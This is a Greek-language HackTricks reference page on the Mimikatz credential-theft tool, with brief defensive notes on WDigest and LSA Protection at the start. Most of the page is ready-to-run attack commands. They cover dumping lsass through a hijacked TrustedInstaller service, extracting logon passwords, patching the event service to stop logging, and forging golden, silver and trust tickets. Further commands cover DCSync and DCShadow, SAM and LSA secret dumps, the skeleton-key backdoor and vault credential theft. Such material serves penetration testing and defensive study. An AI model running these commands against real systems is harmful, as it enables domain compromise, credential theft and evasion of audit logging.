# Mimikatz

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

Εμβαθύνετε την εμπειρία σας στην **Ασφάλεια Κινητών** με την 8kSec Academy. Εξασκηθείτε στην ασφάλεια iOS και Android μέσω των αυτορυθμιζόμενων μαθημάτων μας και αποκτήστε πιστοποίηση:

{% embed url="https://academy.8ksec.io/" %}

**Αυτή η σελίδα βασίζεται σε μία από το [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Ελέγξτε την πρωτότυπη για περισσότερες πληροφορίες!

## LM και Clear-Text στη μνήμη

Από τα Windows 8.1 και Windows Server 2012 R2 και μετά, έχουν εφαρμοστεί σημαντικά μέτρα για την προστασία από την κλοπή διαπιστευτηρίων:

- **LM hashes και plain-text passwords** δεν αποθηκεύονται πλέον στη μνήμη για την ενίσχυση της ασφάλειας. Μια συγκεκριμένη ρύθμιση μητρώου, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ πρέπει να ρυθμιστεί με μια τιμή DWORD `0` για να απενεργοποιηθεί η Αυθεντικοποίηση Digest, διασφαλίζοντας ότι οι "clear-text" κωδικοί πρόσβασης δεν αποθηκεύονται στην LSASS.

- **LSA Protection** εισάγεται για να προστατεύσει τη διαδικασία της Τοπικής Αρχής Ασφαλείας (LSA) από μη εξουσιοδοτημένη ανάγνωση μνήμης και έγχυση κώδικα. Αυτό επιτυγχάνεται με την επισήμανση της LSASS ως προστατευμένη διαδικασία. Η ενεργοποίηση της LSA Protection περιλαμβάνει:
1. Τροποποίηση του μητρώου στο _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ ρυθμίζοντας το `RunAsPPL` σε `dword:00000001`.
2. Υλοποίηση ενός Αντικειμένου Πολιτικής Ομάδας (GPO) που επιβάλλει αυτή την αλλαγή μητρώου σε διαχειριζόμενες συσκευές.

Παρά αυτές τις προστασίες, εργαλεία όπως το Mimikatz μπορούν να παρακάμψουν την LSA Protection χρησιμοποιώντας συγκεκριμένους οδηγούς, αν και τέτοιες ενέργειες είναι πιθανό να καταγραφούν στα αρχεία καταγραφής γεγονότων.

### Αντεπίθεση Αφαίρεσης SeDebugPrivilege

Οι διαχειριστές συνήθως έχουν SeDebugPrivilege, επιτρέποντάς τους να αποσφαλματώνουν προγράμματα. Αυτό το προνόμιο μπορεί να περιοριστεί για να αποτραπούν μη εξουσιοδοτημένες εκφορτώσεις μνήμης, μια κοινή τεχνική που χρησιμοποιούν οι επιτιθέμενοι για να εξάγουν διαπιστευτήρια από τη μνήμη. Ωστόσο, ακόμη και με αυτό το προνόμιο αφαιρεμένο, ο λογαριασμός TrustedInstaller μπορεί να εκτελεί εκφορτώσεις μνήμης χρησιμοποιώντας μια προσαρμοσμένη ρύθμιση υπηρεσίας:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Αυτό επιτρέπει την εξαγωγή της μνήμης του `lsass.exe` σε ένα αρχείο, το οποίο μπορεί στη συνέχεια να αναλυθεί σε άλλο σύστημα για την εξαγωγή διαπιστευτηρίων:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Η παραχάραξη των καταγραφών συμβάντων στο Mimikatz περιλαμβάνει δύο κύριες ενέργειες: την εκκαθάριση των καταγραφών συμβάντων και την επιδιόρθωση της υπηρεσίας Event για να αποτραπεί η καταγραφή νέων συμβάντων. Παρακάτω παρατίθενται οι εντολές για την εκτέλεση αυτών των ενεργειών:

#### Clearing Event Logs

- **Command**: Αυτή η ενέργεια στοχεύει στη διαγραφή των καταγραφών συμβάντων, καθιστώντας πιο δύσκολη την παρακολούθηση κακόβουλων δραστηριοτήτων.
- Το Mimikatz δεν παρέχει άμεση εντολή στην τυπική του τεκμηρίωση για την εκκαθάριση των καταγραφών συμβάντων απευθείας μέσω της γραμμής εντολών του. Ωστόσο, η παραχάραξη των καταγραφών συμβάντων περιλαμβάνει συνήθως τη χρήση εργαλείων συστήματος ή σεναρίων εκτός του Mimikatz για την εκκαθάριση συγκεκριμένων καταγραφών (π.χ. χρησιμοποιώντας PowerShell ή Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Αυτή η πειραματική εντολή έχει σχεδιαστεί για να τροποποιεί τη συμπεριφορά της Υπηρεσίας Καταγραφής Συμβάντων, αποτρέποντας αποτελεσματικά την καταγραφή νέων συμβάντων.
- Παράδειγμα: `mimikatz "privilege::debug" "event::drop" exit`

- Η εντολή `privilege::debug` διασφαλίζει ότι το Mimikatz λειτουργεί με τα απαραίτητα δικαιώματα για να τροποποιήσει τις υπηρεσίες του συστήματος.
- Η εντολή `event::drop` στη συνέχεια επιδιορθώνει την υπηρεσία Καταγραφής Συμβάντων.

### Kerberos Ticket Attacks

### Golden Ticket Creation

Ένα Golden Ticket επιτρέπει την impersonation σε επίπεδο τομέα. Κύρια εντολή και παράμετροι:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Το όνομα τομέα.
- `/sid`: Ο Αναγνωριστικός Αριθμός Ασφαλείας (SID) του τομέα.
- `/user`: Το όνομα χρήστη που θα impersonate.
- `/krbtgt`: Το NTLM hash του λογαριασμού υπηρεσίας KDC του τομέα.
- `/ptt`: Εισάγει απευθείας το εισιτήριο στη μνήμη.
- `/ticket`: Αποθηκεύει το εισιτήριο για μελλοντική χρήση.

Παράδειγμα:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Δημιουργία Silver Ticket

Τα Silver Tickets παρέχουν πρόσβαση σε συγκεκριμένες υπηρεσίες. Κύριες εντολές και παράμετροι:

- Εντολή: Παρόμοια με το Golden Ticket αλλά στοχεύει συγκεκριμένες υπηρεσίες.
- Παράμετροι:
- `/service`: Η υπηρεσία που στοχεύει (π.χ., cifs, http).
- Άλλες παράμετροι παρόμοιες με το Golden Ticket.

Παράδειγμα:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Δημιουργία Εισιτηρίου Εμπιστοσύνης

Τα Εισιτήρια Εμπιστοσύνης χρησιμοποιούνται για την πρόσβαση σε πόρους σε διάφορους τομείς εκμεταλλευόμενα τις σχέσεις εμπιστοσύνης. Κύρια εντολή και παράμετροι:

- Εντολή: Παρόμοια με το Golden Ticket αλλά για σχέσεις εμπιστοσύνης.
- Παράμετροι:
- `/target`: Το FQDN του στόχου τομέα.
- `/rc4`: Το NTLM hash για τον λογαριασμό εμπιστοσύνης.

Παράδειγμα:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Επιπλέον Εντολές Kerberos

- **Καταγραφή Εισιτηρίων**:

- Εντολή: `kerberos::list`
- Καταγράφει όλα τα εισιτήρια Kerberos για την τρέχουσα συνεδρία χρήστη.

- **Περάστε την Κρυφή Μνήμη**:

- Εντολή: `kerberos::ptc`
- Ενσωματώνει εισιτήρια Kerberos από αρχεία κρυφής μνήμης.
- Παράδειγμα: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Περάστε το Εισιτήριο**:

- Εντολή: `kerberos::ptt`
- Επιτρέπει τη χρήση ενός εισιτηρίου Kerberos σε άλλη συνεδρία.
- Παράδειγμα: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Καθαρισμός Εισιτηρίων**:
- Εντολή: `kerberos::purge`
- Καθαρίζει όλα τα εισιτήρια Kerberos από τη συνεδρία.
- Χρήσιμο πριν τη χρήση εντολών χειρισμού εισιτηρίων για αποφυγή συγκρούσεων.

### Παρέμβαση Active Directory

- **DCShadow**: Προσωρινά να κάνει μια μηχανή να λειτουργεί ως DC για χειρισμό αντικειμένων AD.

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Μιμείται ένα DC για να ζητήσει δεδομένα κωδικών πρόσβασης.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Πρόσβαση Διαπιστευτηρίων

- **LSADUMP::LSA**: Εξάγει διαπιστευτήρια από LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Υποδύεται ένα DC χρησιμοποιώντας δεδομένα κωδικών πρόσβασης υπολογιστή.

- _Δεν παρέχεται συγκεκριμένη εντολή για NetSync στο αρχικό κείμενο._

- **LSADUMP::SAM**: Πρόσβαση στη τοπική βάση δεδομένων SAM.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Αποκρυπτογραφεί μυστικά που είναι αποθηκευμένα στο μητρώο.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Ορίζει ένα νέο NTLM hash για έναν χρήστη.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Ανακτά πληροφορίες πιστοποίησης εμπιστοσύνης.
- `mimikatz "lsadump::trust" exit`

### Διάφορα

- **MISC::Skeleton**: Ενσωματώνει ένα backdoor στο LSASS σε ένα DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Κλιμάκωση Δικαιωμάτων

- **PRIVILEGE::Backup**: Αποκτά δικαιώματα αντιγράφου ασφαλείας.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Αποκτά δικαιώματα αποσφαλμάτωσης.
- `mimikatz "privilege::debug" exit`

### Εξαγωγή Διαπιστευτηρίων

- **SEKURLSA::LogonPasswords**: Εμφανίζει διαπιστευτήρια για συνδεδεμένους χρήστες.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Εξάγει εισιτήρια Kerberos από τη μνήμη.
- `mimikatz "sekurlsa::tickets /export" exit`

### Χειρισμός SID και Token

- **SID::add/modify**: Αλλάζει SID και SIDHistory.

- Προσθήκη: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Τροποποίηση: _Δεν παρέχεται συγκεκριμένη εντολή για τροποποίηση στο αρχικό κείμενο._

- **TOKEN::Elevate**: Υποδύεται tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Υπηρεσίες Τερματικού

- **TS::MultiRDP**: Επιτρέπει πολλαπλές συνεδρίες RDP.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Καταγράφει τις συνεδρίες TS/RDP.
- _Δεν παρέχεται συγκεκριμένη εντολή για TS::Sessions στο αρχικό κείμενο._

### Vault

- Εξάγει κωδικούς πρόσβασης από το Windows Vault.
- `mimikatz "vault::cred /patch" exit`

<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>

Εμβαθύνετε την εμπειρία σας στην **Ασφάλεια Κινητών** με την 8kSec Academy. Κατακτήστε την ασφάλεια iOS και Android μέσω των αυτορυθμιζόμενων μαθημάτων μας και αποκτήστε πιστοποίηση:

{% embed url="https://academy.8ksec.io/" %}

{{#include ../../banners/hacktricks-training.md}}
